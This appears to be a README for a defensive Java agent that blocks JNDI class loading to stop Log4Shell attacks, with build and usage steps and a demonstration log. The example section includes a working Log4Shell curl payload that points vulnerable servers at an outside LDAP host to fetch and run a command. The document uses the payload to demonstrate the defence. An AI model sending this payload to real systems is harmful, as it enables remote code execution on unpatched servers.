# Log4J Safety Agent
Quick and directy java agent which prevents JNDI from being instantiated, preventing the recent log4j vulnerability from being taken advantage of. See https://www.cyberkendra.com/2021/12/worst-log4j-rce-zeroday-dropped-on.html.

## Build
```bash
mvn package
```

## Usage
```bash
java -javaagent:./target/log4j-safety-agent-1.0-SNAPSHOT.jar -jar <normal-jar> ...
```

### Arguments
Arguments can be passed via
```bash
-javaagent:./target/log4j-safety-agent-1.0-SNAPSHOT.jar=<arg>=<value>,<arg2>=<value2>,...
```

Optional Arguments:
`aggressive`: Always use `Runtime.halt()` instead of just emptying the JNDI class. Values: `true` or `false`
`ignoreVersions`: Don't check log4j version against list of safe versions. Values: `true` or `false`



### Example
Running against [this](https://github.com/christophetd/log4shell-vulnerable-app) example app:
```bash
java -javaagent:./target/log4j-safety-agent-1.0-SNAPSHOT.jar -jar log4shell-vulnerable-app-0.0.1-SNAPSHOT.jar -i 127.0.0.1 -p 8888
```

And then running from another terminal:
```
> curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
{"timestamp":"2021-12-11T02:03:22.113+00:00","status":500,"error":"Internal Server Error","path":"/"}
```

results in the following log in the example app:
```
  .   ____          _            __ _ _
 /\\ / ___'_ __ _ _(_)_ __  __ _ \ \ \ \
( ( )\___ | '_ | '_| | '_ \/ _` | \ \ \ \
 \\/  ___)| |_)| | | | | || (_| |  ) ) ) )
  '  |____| .__|_| |_|_| |_\__, | / / / /
 =========|_|==============|___/=/_/_/_/
 :: Spring Boot ::                (v2.6.1)

2021-12-10 17:48:48,297 main ERROR Recursive call to appender Console
2021-12-10 17:48:43.292  INFO 57492 --- [           main] f.c.l.v.VulnerableAppApplication         : Starting VulnerableAppApplication using Java 1.8.0_312 on francesco.local with PID 57492 (/Users/francesco/code/log4shell-vulnerable-app/build/libs/log4shell-vulnerable-app-0.0.1-SNAPSHOT.jar started by francesco in /Users/francesco/code/log4shell-vulnerable-app)
2021-12-10 17:48:53.309  INFO 57492 --- [           main] f.c.l.v.VulnerableAppApplication         : No active profile set, falling back to default profiles: default
2021-12-10 17:48:54.007  INFO 57492 --- [           main] o.s.b.w.e.t.TomcatWebServer              : Tomcat initialized with port(s): 8080 (http)
2021-12-10 17:48:54.024  INFO 57492 --- [           main] o.a.c.c.StandardService                  : Starting service [Tomcat]
2021-12-10 17:48:54.024  INFO 57492 --- [           main] o.a.c.c.StandardEngine                   : Starting Servlet engine: [Apache Tomcat/9.0.55]
2021-12-10 17:48:54.065  INFO 57492 --- [           main] o.a.c.c.C.[.[.[/]                        : Initializing Spring embedded WebApplicationContext
2021-12-10 17:48:54.066  INFO 57492 --- [           main] w.s.c.ServletWebServerApplicationContext : Root WebApplicationContext: initialization completed in 722 ms
2021-12-10 17:48:54.433  INFO 57492 --- [           main] o.s.b.w.e.t.TomcatWebServer              : Tomcat started on port(s): 8080 (http) with context path ''
2021-12-10 17:48:54.442  INFO 57492 --- [           main] f.c.l.v.VulnerableAppApplication         : Started VulnerableAppApplication in 26.516 seconds (JVM running for 32.08)
2021-12-10 17:59:47.660  INFO 57492 --- [nio-8080-exec-1] o.a.c.c.C.[.[.[/]                        : Initializing Spring DispatcherServlet 'dispatcherServlet'
2021-12-10 17:59:47.660  INFO 57492 --- [nio-8080-exec-1] o.s.w.s.DispatcherServlet                : Initializing Servlet 'dispatcherServlet'
2021-12-10 17:59:47.661  INFO 57492 --- [nio-8080-exec-1] o.s.w.s.DispatcherServlet                : Completed initialization in 1 ms
Found suspicious class org/apache/logging/log4j/core/net/JndiManager at location: file:/Users/francesco/code/log4shell-vulnerable-app/build/libs/log4shell-vulnerable-app-0.0.1-SNAPSHOT.jar!/BOOT-INF/lib/log4j-core-2.14.1.jar!/
The JVM attempted to load a JNDI Class, and the version doesn't look safe! Killing JVM for safety. Class name: org/apache/logging/log4j/core/net/JndiManager
2021-12-10 17:59:47.688 ERROR 57492 --- [nio-8080-exec-1] o.a.c.c.C.[.[.[.[dispatcherServlet]      : Servlet.service() for servlet [dispatcherServlet] in context with path [] threw exception [Handler dispatch failed; nested exception is java.lang.NoClassDefFoundError: org/apache/logging/log4j/core/net/JndiManager (wrong name: com/foursquare/log4jauditor/FriendlyNeighborhoodJNDIReplacement)] with root cause

java.lang.NoClassDefFoundError: org/apache/logging/log4j/core/net/JndiManager (wrong name: com/foursquare/log4jauditor/FriendlyNeighborhoodJNDIReplacement)
	at java.lang.ClassLoader.defineClass1(Native Method) ~[?:1.8.0_312]
	at java.lang.ClassLoader.defineClass(ClassLoader.java:756) ~[?:1.8.0_312]
	at java.security.SecureClassLoader.defineClass(SecureClassLoader.java:142) ~[?:1.8.0_312]
	at java.net.URLClassLoader.defineClass(URLClassLoader.java:473) ~[?:1.8.0_312]
	at java.net.URLClassLoader.access$100(URLClassLoader.java:74) ~[?:1.8.0_312]
	at java.net.URLClassLoader$1.run(URLClassLoader.java:369) ~[?:1.8.0_312]
	at java.net.URLClassLoader$1.run(URLClassLoader.java:363) ~[?:1.8.0_312]
	at java.security.AccessController.doPrivileged(Native Method) ~[?:1.8.0_312]
	at java.net.URLClassLoader.findClass(URLClassLoader.java:362) ~[?:1.8.0_312]
	at java.lang.ClassLoader.loadClass(ClassLoader.java:418) ~[?:1.8.0_312]
	at org.springframework.boot.loader.LaunchedURLClassLoader.loadClass(LaunchedURLClassLoader.java:151) ~[log4shell-vulnerable-app-0.0.1-SNAPSHOT.jar:?]
	at java.lang.ClassLoader.loadClass(ClassLoader.java:351) ~[?:1.8.0_312]
	at org.apache.logging.log4j.core.lookup.JndiLookup.lookup(JndiLookup.java:55) ~[log4j-core-2.14.1.jar!/:2.14.1]
	at org.apache.logging.log4j.core.lookup.Interpolator.lookup(Interpolator.java:221) ~[log4j-core-2.14.1.jar!/:2.14.1]
	at org.apache.logging.log4j.core.lookup.StrSubstitutor.resolveVariable(StrSubstitutor.java:1110) ~[log4j-core-2.14.1.jar!/:2.14.1]
	at org.apache.logging.log4j.core.lookup.StrSubstitutor.substitute(StrSubstitutor.java:1033) ~[log4j-core-2.14.1.jar!/:2.14.1]
	at org.apache.logging.log4j.core.lookup.StrSubstitutor.substitute(StrSubstitutor.java:912) ~[log4j-core-2.14.1.jar!/:2.14.1]
	at org.apache.logging.log4j.core.lookup.StrSubstitutor.replace(StrSubstitutor.java:467) ~[log4j-core-2.14.1.jar!/:2.14.1]
	at org.apache.logging.log4j.core.pattern.MessagePatternConverter.format(MessagePatternConverter.java:132) ~[log4j-core-2.14.1.jar!/:2.14.1]
	at org.apache.logging.log4j.core.pattern.PatternFormatter.format(PatternFormatter.java:38) ~[log4j-core-2.14.1.jar!/:2.14.1]
	at org.apache.logging.log4j.core.layout.PatternLayout$PatternSerializer.toSerializable(PatternLayout.java:344) ~[log4j-core-2.14.1.jar!/:2.14.1]
	at org.apache.logging.log4j.core.layout.PatternLayout.toText(PatternLayout.java:244) ~[log4j-core-2.14.1.jar!/:2.14.1]
	at org.apache.logging.log4j.core.layout.PatternLayout.encode(PatternLayout.java:229) ~[log4j-core-2.14.1.jar!/:2.14.1]
	at org.apache.logging.log4j.core.layout.PatternLayout.encode(PatternLayout.java:59) ~[log4j-core-2.14.1.jar!/:2.14.1]
	at org.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.directEncodeEvent(AbstractOutputStreamAppender.java:197) ~[log4j-core-2.14.1.jar!/:2.14.1]
	at org.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.tryAppend(AbstractOutputStreamAppender.java:190) ~[log4j-core-2.14.1.jar!/:2.14.1]
	at org.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.append(AbstractOutputStreamAppender.java:181) ~[log4j-core-2.14.1.jar!/:2.14.1]
	at org.apache.logging.log4j.core.config.AppenderControl.tryCallAppender(AppenderControl.java:156) ~[log4j-core-2.14.1.jar!/:2.14.1]
	at org.apache.logging.log4j.core.config.AppenderControl.callAppender0(AppenderControl.java:129) ~[log4j-core-2.14.1.jar!/:2.14.1]
	at org.apache.logging.log4j.core.config.AppenderControl.callAppenderPreventRecursion(AppenderControl.java:120) ~[log4j-core-2.14.1.jar!/:2.14.1]
	at org.apache.logging.log4j.core.config.AppenderControl.callAppender(AppenderControl.java:84) ~[log4j-core-2.14.1.jar!/:2.14.1]
	at org.apache.logging.log4j.core.config.LoggerConfig.callAppenders(LoggerConfig.java:540) ~[log4j-core-2.14.1.jar!/:2.14.1]
	at org.apache.logging.log4j.core.config.LoggerConfig.processLogEvent(LoggerConfig.java:498) ~[log4j-core-2.14.1.jar!/:2.14.1]
	at org.apache.logging.log4j.core.config.LoggerConfig.log(LoggerConfig.java:481) ~[log4j-core-2.14.1.jar!/:2.14.1]
	at org.apache.logging.log4j.core.config.LoggerConfig.log(LoggerConfig.java:456) ~[log4j-core-2.14.1.jar!/:2.14.1]
	at org.apache.logging.log4j.core.config.AwaitCompletionReliabilityStrategy.log(AwaitCompletionReliabilityStrategy.java:82) ~[log4j-core-2.14.1.jar!/:2.14.1]
	at org.apache.logging.log4j.core.Logger.log(Logger.java:161) ~[log4j-core-2.14.1.jar!/:2.14.1]
	at org.apache.logging.log4j.spi.AbstractLogger.tryLogMessage(AbstractLogger.java:2205) ~[log4j-api-2.14.1.jar!/:2.14.1]
	at org.apache.logging.log4j.spi.AbstractLogger.logMessageTrackRecursion(AbstractLogger.java:2159) ~[log4j-api-2.14.1.jar!/:2.14.1]
	at org.apache.logging.log4j.spi.AbstractLogger.logMessageSafely(AbstractLogger.java:2142) ~[log4j-api-2.14.1.jar!/:2.14.1]
	at org.apache.logging.log4j.spi.AbstractLogger.logMessage(AbstractLogger.java:2017) ~[log4j-api-2.14.1.jar!/:2.14.1]
	at org.apache.logging.log4j.spi.AbstractLogger.logIfEnabled(AbstractLogger.java:1983) ~[log4j-api-2.14.1.jar!/:2.14.1]
	at org.apache.logging.log4j.spi.AbstractLogger.info(AbstractLogger.java:1320) ~[log4j-api-2.14.1.jar!/:2.14.1]
	at fr.christophetd.log4shell.vulnerableapp.MainController.index(MainController.java:18) ~[classes!/:?]
	...
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.55.jar!/:?]
	at java.lang.Thread.run(Thread.java:748) [?:1.8.0_312]
```